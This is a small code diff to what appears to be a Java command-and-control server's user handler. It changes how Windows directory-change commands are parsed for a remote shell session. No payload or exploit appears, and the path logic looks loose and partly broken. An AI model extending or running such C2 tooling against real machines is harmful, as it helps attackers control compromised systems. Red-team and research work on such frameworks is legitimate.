@@ -338,7 +338,7 @@ public class C2ServerUserHandler implements Runnable{
                         } else {
                             // Windows
                             dir = command.substring(3);
-                            if (dir.substring(0,3).equals("C:\\")){
+                            if (dir.contains("C:\\")){
                                 currentDirectory = dir;
                             } else if (dir.equals("..")) {
                                 dirs = currentDirectory.split("\\");
